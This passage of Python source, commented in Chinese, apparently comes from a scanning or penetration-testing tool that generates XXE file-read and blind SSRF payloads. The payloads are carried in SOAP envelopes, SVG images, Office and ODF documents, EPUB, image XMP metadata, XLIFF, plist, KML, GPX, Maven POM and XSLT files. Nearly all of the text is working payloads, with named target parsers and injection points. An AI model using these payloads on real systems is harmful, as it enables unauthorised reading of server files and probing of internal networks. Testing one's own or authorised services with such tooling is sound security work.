        XSI_NS = "http://www.w3.org/2001/XMLSchema-instance"
        SOAP11 = "http://schemas.xmlsoap.org/soap/envelope/"
        SOAP12 = "http://www.w3.org/2003/05/soap-envelope"

        results = []

        results.append({
            "name": "soap_1_1_xxe_file_read",
            "technique": "SOAP 1.1 XXE",
            "description": "SOAP 1.1 Body 中回显外部实体",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                "<!DOCTYPE Envelope [\n"
                f"  <!ENTITY xxe SYSTEM "
                f"{xml_attr(self._read_uri('soap', 'soap_1_1_xxe_file_read'))}>\n"
                "]>\n"
                f'<soap:Envelope xmlns:soap="{SOAP11}">\n'
                "  <soap:Header/>\n"
                "  <soap:Body>\n"
                '    <GetUserInfo xmlns="urn:example:service">\n'
                "      <username>&xxe;</username>\n"
                "    </GetUserInfo>\n"
                "  </soap:Body>\n"
                "</soap:Envelope>"
            ),
            "file_ext": ".xml",
            "content_type": "text/xml; charset=utf-8",
            "method": "POST",
            "injection_point": "SOAP 请求体",
            "headers": {
                "Content-Type": "text/xml; charset=utf-8",
                "SOAPAction": "urn:example:service#GetUserInfo",
            },
            "target_component": ["Axis2", "CXF", "JAX-WS", "老牌 SOAP WebService"],
            "soap_mtom": True,
            "benign": self.benign,
            "interpretation": {
                "username 节点出现文件内容": "存在 XXE 且回显",
                "报错": "查看错误信息判断加固程度",
            },
            "expected_when_fixed": "不回显文件内容",
            "expected_when_vulnerable": "文件内容出现在响应",
            "requirements": ["SOAP 端点接受任意 XML"],
        })

        results.append({
            "name": "soap_1_2_xxe_file_read",
            "technique": "SOAP 1.2 XXE",
            "description": "SOAP 1.2 命名空间变体",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                "<!DOCTYPE Envelope [\n"
                f"  <!ENTITY xxe SYSTEM "
                f"{xml_attr(self._read_uri('soap', 'soap_1_2_xxe_file_read'))}>\n"
                "]>\n"
                f'<soap:Envelope xmlns:soap="{SOAP12}">\n'
                "  <soap:Header/>\n"
                "  <soap:Body>\n"
                '    <GetData xmlns="urn:example:service">\n'
                "      <param>&xxe;</param>\n"
                "    </GetData>\n"
                "  </soap:Body>\n"
                "</soap:Envelope>"
            ),
            "file_ext": ".xml",
            "content_type": "application/soap+xml; charset=utf-8",
            "method": "POST",
            "injection_point": "SOAP 请求体",
            "headers": {"Content-Type": "application/soap+xml; charset=utf-8"},
            "target_component": ["WCF", ".NET WSDL 服务", "JAX-WS 1.2"],
            "soap_mtom": True,
            "benign": self.benign,
            "interpretation": {"出现文件内容": "存在 XXE"},
            "expected_when_fixed": "不回显",
            "expected_when_vulnerable": "回显文件内容",
            "requirements": [],
        })

        results.append({
            "name": "soap_xinclude_file_read",
            "technique": "SOAP XInclude",
            "description": "SOAP Body 中用 XInclude 读取文件（绕过 DOCTYPE 禁用）",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<soap:Envelope xmlns:soap="{SOAP11}" xmlns:xi="{XI_NS}">\n'
                "  <soap:Header/>\n"
                "  <soap:Body>\n"
                '    <GetUserInfo xmlns="urn:example:service">\n'
                "      <username>"
                f'<xi:include parse="text" '
                f'href={xml_attr(self._read_uri("soap", "soap_xinclude_file_read"))}/>'
                "</username>\n"
                "    </GetUserInfo>\n"
                "  </soap:Body>\n"
                "</soap:Envelope>"
            ),
            "file_ext": ".xml",
            "content_type": "text/xml; charset=utf-8",
            "method": "POST",
            "headers": {"Content-Type": "text/xml; charset=utf-8"},
            "target_component": ["禁用 DOCTYPE 但启用 XInclude 的 SOAP 栈"],
            "benign": self.benign,
            "interpretation": {"出现文件内容": "XInclude 可用"},
            "expected_when_fixed": "不回显",
            "expected_when_vulnerable": "回显文件内容",
            "requirements": ["启用 XInclude"],
        })

        results.append({
            "name": "soap_schema_ssrf",
            "technique": "SOAP Schema SSRF",
            "description": "SOAP Body 元素上的 schemaLocation 触发 SSRF",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<soap:Envelope xmlns:soap="{SOAP11}" xmlns:xsi="{XSI_NS}">\n'
                "  <soap:Header/>\n"
                "  <soap:Body>\n"
                '    <GetData xmlns="urn:example:service" '
                f'xsi:schemaLocation='
                f'{xml_attr("urn:example:service " + self._ssrf_uri("soap", "soap_schema_ssrf"))}>\n'
                "      <param>test</param>\n"
                "    </GetData>\n"
                "  </soap:Body>\n"
                "</soap:Envelope>"
            ),
            "file_ext": ".xml",
            "content_type": "text/xml; charset=utf-8",
            "method": "POST",
            "headers": {"Content-Type": "text/xml; charset=utf-8"},
            "target_component": ["启用 Schema 校验的 SOAP 服务"],
            "benign": self.benign,
            "interpretation": {"收到 XSD 请求": "SSRF 成立"},
            "expected_when_fixed": "零回连",
            "expected_when_vulnerable": "收到请求",
            "requirements": ["启用 Schema 校验"],
        })

        results.append({
            "name": "soap_wsdl_ssrf",
            "technique": "WSDL 导入 SSRF",
            "description": "向服务端提交一个 wsdl:import 指向内网的 WSDL",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<definitions xmlns="http://schemas.xmlsoap.org/wsdl/" '
                'xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/" '
                'targetNamespace="urn:probe">\n'
                f'  <import namespace="urn:probe" '
                f'location={xml_attr(self._ssrf_uri("soap", "soap_wsdl_ssrf"))}/>\n'
                "</definitions>"
            ),
            "file_ext": ".wsdl",
            "content_type": "text/xml",
            "method": "POST",
            "target_component": ["支持动态 WSDL 导入的服务（Axis 老版本常见）"],
            "benign": self.benign,
            "interpretation": {"收到 WSDL 请求": "服务端会抓取外部 WSDL，构成 SSRF"},
            "expected_when_fixed": "零回连",
            "expected_when_vulnerable": "收到请求",
            "requirements": ["服务端会根据提交的 WSDL 去抓 import"],
        })
        return results

    def generate_svg_payloads(self) -> List[Dict]:

        basic = {
            "name": "svg_xxe_file_read",
            "technique": "SVG 外部实体文件读取",
            "description": "SVG 是合法 XML，是最容易被忽略的上传 XXE 入口",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                "<!DOCTYPE svg [\n"
                f"  <!ENTITY xxe SYSTEM "
                f"{xml_attr(self._read_uri('svg', 'svg_xxe_file_read'))}>\n"
                "]>\n"
                '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">\n'
                '  <text x="10" y="20">&xxe;</text>\n'
                "</svg>"
            ),
            "file_ext": ".svg",
            "content_type": "image/svg+xml",
            "injection_point": "文件上传 / 头像 / 图片处理接口",
            "target_component": ["ImageMagick", "Batik", "rsvg-convert", "Inkscape",
                                 "PDF 转换器", "头像裁剪服务"],
            "benign": self.benign,
            "interpretation": {
                "转换后的图片里出现文件内容": "存在 XXE 且渲染了文本",
                "报错": "看错误信息判断加固程度",
            },
            "expected_when_fixed": "文本不渲染 / 文件被拒绝",
            "expected_when_vulnerable": "文件内容被渲染进图片",
            "requirements": ["服务端会用 XML 解析器处理 SVG"],
        }

        ssrf = {
            "name": "svg_blind_ssrf",
            "technique": "SVG Blind SSRF",
            "description": "SVG 不回显时触发服务端出网请求",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                "<!DOCTYPE svg [\n"
                f"  <!ENTITY % ext SYSTEM "
                f"{xml_attr(self._ssrf_uri('svg', 'svg_blind_ssrf'))}>\n"
                "%ext;\n"
                "]>\n"
                '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">\n'
                '  <rect width="200" height="200" fill="#fff"/>\n'
                "</svg>"
            ),
            "file_ext": ".svg",
            "content_type": "image/svg+xml",
            "injection_point": "文件上传 / 图片处理接口",
            "target_component": ["同上"],
            "benign": self.benign,
            "interpretation": {"收到请求": "SSRF 成立"},
            "expected_when_fixed": "零回连",
            "expected_when_vulnerable": "收到请求",
            "requirements": [],
        }

        xlink = {
            "name": "svg_xlink_ssrf",
            "technique": "SVG xlink:href SSRF",
            "description": "通过 xlink:href 让渲染器抓取外部资源",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<svg xmlns="http://www.w3.org/2000/svg" '
                'xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">\n'
                f'  <image x="0" y="0" width="200" height="200" '
                f'xlink:href={xml_attr(self._ssrf_uri("svg", "svg_xlink_ssrf"))}/>\n'
                "</svg>"
            ),
            "file_ext": ".svg",
            "content_type": "image/svg+xml",
            "injection_point": "文件上传 / 图片处理接口",
            "target_component": ["会实际渲染并抓取外部引用的转换器"],
            "benign": self.benign,
            "interpretation": {"收到图片请求": "渲染器会抓外部资源，构成 SSRF"},
            "expected_when_fixed": "零回连",
            "expected_when_vulnerable": "收到请求",
            "requirements": ["渲染器支持外部引用"],
        }

        css_import = {
            "name": "svg_css_import_ssrf",
            "technique": "SVG CSS @import SSRF",
            "description": "内嵌 <style> 里的 @import 触发外部请求",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">\n'
                "  <style>@import url('"
                f"{self._css_uri('svg', 'svg_css_import_ssrf')}"
                "');</style>\n"
                "</svg>"
            ),
            "file_ext": ".svg",
            "content_type": "image/svg+xml",
            "injection_point": "文件上传 / 图片处理接口",
            "target_component": ["支持 CSS 的 SVG 渲染器（Batik / librsvg）"],
            "benign": self.benign,
            "interpretation": {"收到 CSS 请求": "SSRF 成立"},
            "expected_when_fixed": "零回连",
            "expected_when_vulnerable": "收到请求",
            "requirements": ["渲染器支持内嵌 CSS"],
        }
        return [basic, ssrf, xlink, css_import]

    def generate_office_payloads(self) -> List[Dict]:
        results = []

        for kind, ext, ct in (("docx", ".docx",
                               "application/vnd.openxmlformats-officedocument."
                               "wordprocessingml.document"),
                              ("xlsx", ".xlsx",
                               "application/vnd.openxmlformats-officedocument."
                               "spreadsheetml.sheet"),
                              ("pptx", ".pptx",
                               "application/vnd.openxmlformats-officedocument."
                               "presentationml.presentation")):

            results.append({
                "name": f"office_{kind}_customxml_xxe",
                "technique": "OOXML customXml 注入",
                "description": (
                    f"{ext} 容器内 customXml/item1.xml 注入 XXE。"
                    "自定义 XML 部件常被单独解析用于数据绑定"
                ),
                "payload": (
                    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
                    "<!DOCTYPE root [\n"
                    f"  <!ENTITY xxe SYSTEM "
                    f"{xml_attr(self._read_uri('ooxml', f'office_{kind}_customxml_xxe'))}>\n"
                    "]>\n"
                    "<root>&xxe;</root>"
                ),
                "file_ext": ext,
                "content_type": ct,
                "injection_point": "customXml/item1.xml",
                "ooxml_kind": kind,
                "ooxml_injection": "customxml",
                "target_component": ["Apache POI", "docx4j", "OpenXML SDK",
                                     "文档解析服务", "简历解析", "合同抽取"],
                "benign": self.benign,
                "interpretation": {
                    "解析结果含文件内容": "存在 XXE",
                    "报错 DOCTYPE 被禁": "解析器已加固",
                },
                "expected_when_fixed": "不解析实体",
                "expected_when_vulnerable": "文件内容被带入解析结果",
                "requirements": ["服务端会解析 OOXML 内部 XML 部件"],
            })

            if kind == "docx":
                results.append({
                    "name": "office_docx_document_xxe",
                    "technique": "OOXML document.xml 注入",
                    "description": "直接污染主文档部件，命中正文渲染 / 文本抽取路径",
                    "payload": (
                        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
                        "<!DOCTYPE w:document [\n"
                        f"  <!ENTITY xxe SYSTEM "
                        f"{xml_attr(self._read_uri('ooxml', f'office_{kind}_document_xxe'))}>\n"
                        "]>\n"
                        f'<w:document xmlns:w="{WML_NS}">\n'
                        "  <w:body>\n"
                        '    <w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>\n'
                        "  </w:body>\n"
                        "</w:document>"
                    ),
                    "file_ext": ".docx",
                    "content_type": ct,
                    "injection_point": "word/document.xml",
                    "ooxml_kind": "docx",
                    "ooxml_injection": "document",
                    "target_component": ["Apache POI XWPF", "docx4j", "文本抽取管道"],
                    "benign": self.benign,
                    "interpretation": {"抽取的正文含文件内容": "存在 XXE"},
                    "expected_when_fixed": "不解析实体",
                    "expected_when_vulnerable": "文件内容进入抽取文本",
                    "requirements": [],
                })

            results.append({
                "name": f"office_{kind}_coreprops_xxe",
                "technique": "OOXML docProps/core.xml 注入",
                "description": "污染核心属性部件，命中元数据抽取路径（很多服务只抽元数据）",
                "payload": (
                    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
                    "<!DOCTYPE cp:coreProperties [\n"
                    f"  <!ENTITY xxe SYSTEM "
                    f"{xml_attr(self._read_uri('ooxml', f'office_{kind}_coreprops_xxe'))}>\n"
                    "]>\n"
                    '<cp:coreProperties '
                    'xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" '
                    'xmlns:dc="http://purl.org/dc/elements/1.1/">\n'
                    "  <dc:title>&xxe;</dc:title>\n"
                    '  <dc:creator>XXE Probe</dc:creator>\n'
                    "</cp:coreProperties>"
                ),
                "file_ext": ext,
                "content_type": ct,
                "injection_point": "docProps/core.xml",
                "ooxml_kind": kind,
                "ooxml_injection": "coreprops",
                "target_component": ["元数据抽取服务", "文档索引器", "全文检索预处理"],
                "benign": self.benign,
                "interpretation": {"抽取的 title 含文件内容": "存在 XXE"},
                "expected_when_fixed": "不解析实体",
                "expected_when_vulnerable": "文件内容进入元数据",
                "requirements": ["服务端会读取 core.xml"],
            })

            results.append({
                "name": f"office_{kind}_blind_ssrf",
                "technique": "OOXML Blind SSRF",
                "description": "不回显时的出网探测",
                "payload": (
                    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
                    "<!DOCTYPE root [\n"
                    f"  <!ENTITY % ext SYSTEM "
                    f"{xml_attr(self._ssrf_uri('ooxml', f'office_{kind}_blind_ssrf'))}>\n"
                    "%ext;\n"
                    "]>\n"
                    "<root>probe</root>"
                ),
                "file_ext": ext,
                "content_type": ct,
                "injection_point": "customXml/item1.xml",
                "ooxml_kind": kind,
                "ooxml_injection": "customxml",
                "target_component": ["同上"],
                "benign": self.benign,
                "interpretation": {"收到请求": "SSRF 成立"},
                "expected_when_fixed": "零回连",
                "expected_when_vulnerable": "收到请求",
                "requirements": [],
            })

        return results

    def generate_odf_payloads(self) -> List[Dict]:
        results = []

        for kind, ext, mime in (("odt", ".odt", _ODF_MIMETYPES["odt"]),
                                ("ods", ".ods", _ODF_MIMETYPES["ods"]),
                                ("odp", ".odp", _ODF_MIMETYPES["odp"])):
            results.append({
                "name": f"odf_{kind}_content_xxe",
                "technique": "ODF content.xml 注入",
                "description": f"{ext} 容器内 content.xml 注入 XXE",
                "payload": (
                    '<?xml version="1.0" encoding="UTF-8"?>\n'
                    "<!DOCTYPE office:document-content [\n"
                    f"  <!ENTITY xxe SYSTEM "
                    f"{xml_attr(self._read_uri('odf', f'odf_{kind}_content_xxe'))}>\n"
                    "]>\n"
                    f'<office:document-content xmlns:office="{ODF_OFFICE_NS}" '
                    'xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" '
                    'office:version="1.2">\n'
                    "  <office:body>\n"
                    "    <office:text><text:p>&xxe;</text:p></office:text>\n"
                    "  </office:body>\n"
                    "</office:document-content>"
                ),
                "file_ext": ext,
                "content_type": mime,
                "injection_point": "content.xml",
                "odf_kind": kind,
                "odf_mimetype": mime,
                "odf_injection": "content",
                "target_component": ["LibreOffice 无头转换", "ODFDOM", "文档预览服务"],
                "benign": self.benign,
                "interpretation": {"转换输出含文件内容": "存在 XXE"},
                "expected_when_fixed": "不解析实体",
                "expected_when_vulnerable": "文件内容进入转换输出",
                "requirements": ["服务端用 XML 解析器处理 ODF"],
            })

            results.append({
                "name": f"odf_{kind}_meta_xxe",
                "technique": "ODF meta.xml 注入",
                "description": "污染元数据部件，命中只抽取元数据的服务",
                "payload": (
                    '<?xml version="1.0" encoding="UTF-8"?>\n'
                    "<!DOCTYPE office:document-meta [\n"
                    f"  <!ENTITY xxe SYSTEM "
                    f"{xml_attr(self._read_uri('odf', f'odf_{kind}_meta_xxe'))}>\n"
                    "]>\n"
                    f'<office:document-meta xmlns:office="{ODF_OFFICE_NS}" '
                    'xmlns:dc="http://purl.org/dc/elements/1.1/" office:version="1.2">\n'
                    "  <office:meta><dc:title>&xxe;</dc:title></office:meta>\n"
                    "</office:document-meta>"
                ),
                "file_ext": ext,
                "content_type": mime,
                "injection_point": "meta.xml",
                "odf_kind": kind,
                "odf_mimetype": mime,
                "odf_injection": "meta",
                "target_component": ["元数据抽取服务"],
                "benign": self.benign,
                "interpretation": {"抽取的 title 含文件内容": "存在 XXE"},
                "expected_when_fixed": "不解析实体",
                "expected_when_vulnerable": "文件内容进入元数据",
                "requirements": ["服务端会读取 meta.xml"],
            })

            results.append({
                "name": f"odf_{kind}_blind_ssrf",
                "technique": "ODF Blind SSRF",
                "description": "不回显时的出网探测",
                "payload": (
                    '<?xml version="1.0" encoding="UTF-8"?>\n'
                    "<!DOCTYPE office:document-content [\n"
                    f"  <!ENTITY % ext SYSTEM "
                    f"{xml_attr(self._ssrf_uri('odf', f'odf_{kind}_blind_ssrf'))}>\n"
                    "%ext;\n"
                    "]>\n"
                    f'<office:document-content xmlns:office="{ODF_OFFICE_NS}" '
                    'office:version="1.2"><office:body/></office:document-content>'
                ),
                "file_ext": ext,
                "content_type": mime,
                "injection_point": "content.xml",
                "odf_kind": kind,
                "odf_mimetype": mime,
                "odf_injection": "content",
                "target_component": ["同上"],
                "benign": self.benign,
                "interpretation": {"收到请求": "SSRF 成立"},
                "expected_when_fixed": "零回连",
                "expected_when_vulnerable": "收到请求",
                "requirements": [],
            })

        return results

    def generate_epub_payloads(self) -> List[Dict]:

        opf = {
            "name": "epub_opf_xxe",
            "technique": "EPUB OPF 注入",
            "description": "EPUB 的 content.opf 是必解析的元数据文件",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                "<!DOCTYPE package [\n"
                f"  <!ENTITY xxe SYSTEM "
                f"{xml_attr(self._read_uri('epub', 'epub_opf_xxe'))}>\n"
                "]>\n"
                '<package xmlns="http://www.idpf.org/2007/opf" version="3.0" '
                'unique-identifier="pub-id">\n'
                '  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">\n'
                '    <dc:identifier id="pub-id">probe</dc:identifier>\n'
                "    <dc:title>&xxe;</dc:title>\n"
                '    <dc:language>en</dc:language>\n'
                "  </metadata>\n"
                '  <manifest><item id="c1" href="chapter1.xhtml" media-type="application/xhtml+xml"/></manifest>\n'
                '  <spine><itemref idref="c1"/></spine>\n'
                "</package>"
            ),
            "file_ext": ".epub",
            "content_type": "application/epub+zip",
            "injection_point": "OEBPS/content.opf",
            "epub": True,
            "target_component": ["电子书解析库", "在线阅读器", "EPUB 转 PDF 服务"],
            "benign": self.benign,
            "interpretation": {"title 含文件内容": "存在 XXE"},
            "expected_when_fixed": "不解析实体",
            "expected_when_vulnerable": "文件内容进入 title",
            "requirements": ["服务端会解析 OPF"],
        }

        blind = {
            "name": "epub_blind_ssrf",
            "technique": "EPUB Blind SSRF",
            "description": "EPUB 场景的出网探测",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                "<!DOCTYPE package [\n"
                f"  <!ENTITY % ext SYSTEM "
                f"{xml_attr(self._ssrf_uri('epub', 'epub_blind_ssrf'))}>\n"
                "%ext;\n"
                "]>\n"
                '<package xmlns="http://www.idpf.org/2007/opf" version="3.0" '
                'unique-identifier="pub-id">\n'
                '  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">\n'
                '    <dc:identifier id="pub-id">probe</dc:identifier>\n'
                "  </metadata>\n"
                "  <manifest/>\n<spine/>\n</package>"
            ),
            "file_ext": ".epub",
            "content_type": "application/epub+zip",
            "injection_point": "OEBPS/content.opf",
            "epub": True,
            "target_component": ["同上"],
            "benign": self.benign,
            "interpretation": {"收到请求": "SSRF 成立"},
            "expected_when_fixed": "零回连",
            "expected_when_vulnerable": "收到请求",
            "requirements": [],
        }
        return [opf, blind]

    def generate_xmp_image_payloads(self) -> List[Dict]:
        results = []

        for carrier, ext, ct in (("jpg", ".jpg", "image/jpeg"),
                                 ("png", ".png", "image/png")):
            # [v2.3][P1] payload 即完整 XMP 包：DOCTYPE 位于根元素之前，
            # 否则产出的包非良构，XMP 探针永远不会触发
            results.append({
                "name": f"{carrier}_xmp_xxe",
                "technique": f"{ext.upper()} XMP 元数据注入",
                "description": (
                    f"生成真实可解码的 {ext} 文件，把 XXE 塞进 XMP 元数据块。"
                    "很多图片处理链会单独解析 XMP"
                ),
                "payload": build_xmp_packet(
                    f"  <!ENTITY xxe SYSTEM "
                    f"{xml_attr(self._read_uri('xmp', f'{carrier}_xmp_xxe'))}>",
                    "      <dc:title>&xxe;</dc:title>",
                ),
                "file_ext": ext,
                "content_type": ct,
                "injection_point": "XMP 元数据块",
                "binary_carrier": carrier,
                "target_component": ["ExifTool", "ImageMagick", "metadata-extractor",
                                     "图片 CDN", "相册 / 图床"],
                "benign": self.benign,
                "interpretation": {
                    "抽取的 XMP 中含文件内容": "存在 XXE",
                    "XMP 被原样保留": "XMP 未被当作 XML 解析",
                },
                "expected_when_fixed": "XMP 不被解析为 XML 实体",
                "expected_when_vulnerable": "文件内容进入抽取的元数据",
                "requirements": ["服务端会解析图片的 XMP 块"],
            })

            results.append({
                "name": f"{carrier}_xmp_blind_ssrf",
                "technique": f"{ext.upper()} XMP Blind SSRF",
                "description": "图片 XMP 场景的出网探测",
                "payload": build_xmp_packet(
                    f"  <!ENTITY % ext SYSTEM "
                    f"{xml_attr(self._ssrf_uri('xmp', f'{carrier}_xmp_blind_ssrf'))}>\n"
                    "%ext;",
                    "      <dc:title>probe</dc:title>",
                ),
                "file_ext": ext,
                "content_type": ct,
                "injection_point": "XMP 元数据块",
                "binary_carrier": carrier,
                "target_component": ["同上"],
                "benign": self.benign,
                "interpretation": {"收到请求": "SSRF 成立"},
                "expected_when_fixed": "零回连",
                "expected_when_vulnerable": "收到请求",
                "requirements": [],
            })

        return results

    def generate_misc_xml_payloads(self) -> List[Dict]:
        results = []

        results.append({
            "name": "excel2003_xml_spreadsheet_xxe",
            "technique": "Excel 2003 XML Spreadsheet",
            "description": "老版本 Excel XML 格式，本质是纯 XML",
            "payload": (
                '<?xml version="1.0"?>\n'
                '<?mso-application progid="Excel.Sheet"?>\n'
                "<!DOCTYPE Workbook [\n"
                f"  <!ENTITY xxe SYSTEM "
                f"{xml_attr(self._read_uri('misc', 'excel2003_xml_spreadsheet_xxe'))}>\n"
                "]>\n"
                '<Workbook xmlns="urn:schemas-microsoft-com:office:spreadsheet" '
                'xmlns:ss="urn:schemas-microsoft-com:office:spreadsheet">\n'
                '  <Worksheet ss:Name="Sheet1">\n'
                "    <Table>\n"
                '      <Row><Cell><Data ss:Type="String">&xxe;</Data></Cell></Row>\n'
                "    </Table>\n"
                "  </Worksheet>\n"
                "</Workbook>"
            ),
            "file_ext": ".xml",
            "content_type": "application/vnd.ms-excel",
            "target_component": ["老版 Excel", "报表导入", "数据导入服务"],
            "benign": self.benign,
            "interpretation": {"导入结果含文件内容": "存在 XXE"},
            "expected_when_fixed": "不解析实体",
            "expected_when_vulnerable": "文件内容进入导入结果",
            "requirements": [],
        })

        results.append({
            "name": "xliff_xxe",
            "technique": "XLIFF 翻译文件",
            "description": "翻译平台 / i18n 工具链常见格式",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                "<!DOCTYPE xliff [\n"
                f"  <!ENTITY xxe SYSTEM "
                f"{xml_attr(self._read_uri('misc', 'xliff_xxe'))}>\n"
                "]>\n"
                '<xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">\n'
                '  <file source-language="en" target-language="zh" datatype="plaintext">\n'
                "    <body>\n"
                '      <trans-unit id="1"><source>&xxe;</source><target/></trans-unit>\n'
                "    </body>\n"
                "  </file>\n"
                "</xliff>"
            ),
            "file_ext": ".xlf",
            "content_type": "application/xliff+xml",
            "target_component": ["翻译管理系统", "Crowdin / Transifex 类平台", "i18n 流水线"],
            "benign": self.benign,
            "interpretation": {"导入的译文含文件内容": "存在 XXE"},
            "expected_when_fixed": "不解析实体",
            "expected_when_vulnerable": "文件内容进入翻译单元",
            "requirements": [],
        })

        results.append({
            "name": "plist_xxe",
            "technique": "Apple PLIST",
            "description": "Apple 生态配置文件格式",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE plist [\n'
                f"  <!ENTITY xxe SYSTEM "
                f"{xml_attr(self._read_uri('misc', 'plist_xxe'))}>\n"
                "]>\n"
                '<plist version="1.0">\n'
                "  <dict>\n"
                "    <key>Name</key>\n"
                "    <string>&xxe;</string>\n"
                "  </dict>\n"
                "</plist>"
            ),
            "file_ext": ".plist",
            "content_type": "text/xml",
            "target_component": ["MDM", "iOS 配置解析", "IPA 分析平台"],
            "benign": self.benign,
            "interpretation": {"Name 字段含文件内容": "存在 XXE"},
            "expected_when_fixed": "不解析实体",
            "expected_when_vulnerable": "文件内容进入字段",
            "requirements": [],
        })

        results.append({
            "name": "kml_xxe",
            "technique": "KML 地理数据",
            "description": "地图 / GIS 数据导入",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                "<!DOCTYPE kml [\n"
                f"  <!ENTITY xxe SYSTEM "
                f"{xml_attr(self._read_uri('misc', 'kml_xxe'))}>\n"
                "]>\n"
                '<kml xmlns="http://www.opengis.net/kml/2.2">\n'
                "  <Placemark>\n"
                "    <name>&xxe;</name>\n"
                "    <Point><coordinates>0,0</coordinates></Point>\n"
                "  </Placemark>\n"
                "</kml>"
            ),
            "file_ext": ".kml",
            "content_type": "application/vnd.google-earth.kml+xml",
            "target_component": ["GIS 平台", "地图数据导入", "轨迹分析"],
            "benign": self.benign,
            "interpretation": {"Placemark 名称含文件内容": "存在 XXE"},
            "expected_when_fixed": "不解析实体",
            "expected_when_vulnerable": "文件内容进入名称",
            "requirements": [],
        })

        results.append({
            "name": "gpx_xxe",
            "technique": "GPX 轨迹数据",
            "description": "运动 / 轨迹类应用的上传格式",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                "<!DOCTYPE gpx [\n"
                f"  <!ENTITY xxe SYSTEM "
                f"{xml_attr(self._read_uri('misc', 'gpx_xxe'))}>\n"
                "]>\n"
                '<gpx version="1.1" creator="probe" '
                'xmlns="http://www.topografix.com/GPX/1/1">\n'
                "  <metadata><name>&xxe;</name></metadata>\n"
                "</gpx>"
            ),
            "file_ext": ".gpx",
            "content_type": "application/gpx+xml",
            "target_component": ["运动应用", "轨迹分析平台"],
            "benign": self.benign,
            "interpretation": {"元数据名称含文件内容": "存在 XXE"},
            "expected_when_fixed": "不解析实体",
            "expected_when_vulnerable": "文件内容进入元数据",
            "requirements": [],
        })

        results.append({
            "name": "maven_pom_xxe",
            "technique": "Maven POM",
            "description": "CI/CD 中如果会解析上传的 pom.xml",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                "<!DOCTYPE project [\n"
                f"  <!ENTITY xxe SYSTEM "
                f"{xml_attr(self._read_uri('misc', 'maven_pom_xxe'))}>\n"
                "]>\n"
                '<project xmlns="http://maven.apache.org/POM/4.0.0">\n'
                "  <modelVersion>4.0.0</modelVersion>\n"
                "  <groupId>probe</groupId>\n"
                "  <artifactId>&xxe;</artifactId>\n"
                "  <version>1.0</version>\n"
                "</project>"
            ),
            "file_ext": ".xml",
            "content_type": "application/xml",
            "target_component": ["CI/CD", "依赖扫描", "制品分析"],
            "benign": self.benign,
            "interpretation": {"artifactId 含文件内容": "存在 XXE"},
            "expected_when_fixed": "不解析实体",
            "expected_when_vulnerable": "文件内容进入 artifactId",
            "requirements": [],
        })

        results.append({
            "name": "xmp_standalone_xxe",
            "technique": "独立 .xmp 文件",
            "description": "作为独立文件上传的 XMP 打包包（sidecar）",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                "<!DOCTYPE x:xmpmeta [\n"
                f"  <!ENTITY xxe SYSTEM "
                f"{xml_attr(self._read_uri('misc', 'xmp_standalone_xxe'))}>\n"
                "]>\n"
                '<x:xmpmeta xmlns:x="adobe:ns:meta/">\n'
                '  <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">\n'
                '    <rdf:Description xmlns:dc="http://purl.org/dc/elements/1.1/">\n'
                "      <dc:title>&xxe;</dc:title>\n"
                "    </rdf:Description>\n"
                "  </rdf:RDF>\n"
                "</x:xmpmeta>"
            ),
            "file_ext": ".xmp",
            "content_type": "application/xml",
            "target_component": ["DAM 数字资产管理", "图片处理流水线"],
            "benign": self.benign,
            "interpretation": {"title 含文件内容": "存在 XXE"},
            "expected_when_fixed": "不解析实体",
            "expected_when_vulnerable": "文件内容进入 title",
            "requirements": [],
        })

        results.append({
            "name": "xslt_ssrf",
            "technique": "XSLT document() / xsl:import SSRF",
            "description": "报表转换 / XSLT 处理器场景，v2.0 完全未覆盖",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<xsl:stylesheet version="1.0" '
                'xmlns:xsl="http://www.w3.org/1999/XSL/Transform">\n'
                f'  <xsl:import href={xml_attr(self._ssrf_uri("misc", "xslt_ssrf"))}/>\n'
                '  <xsl:template match="/">\n'
                f'    <out><xsl:value-of select='
                f'{xml_attr("document(" + self._read_uri("misc", "xslt_ssrf") + ")")}/></out>\n'
                "  </xsl:template>\n"
                "</xsl:stylesheet>"
            ),
            "file_ext": ".xsl",
            "content_type": "application/xml",
            "target_component": ["Xalan", "Saxon", "报表引擎", "XML 转换服务"],
            "benign": self.benign,
            "interpretation": {
                "收到 import 请求": "XSLT 会抓外部资源，构成 SSRF",
                "输出含文件内容": "document() 读取成功",
            },
            "expected_when_fixed": "零回连且输出为空",
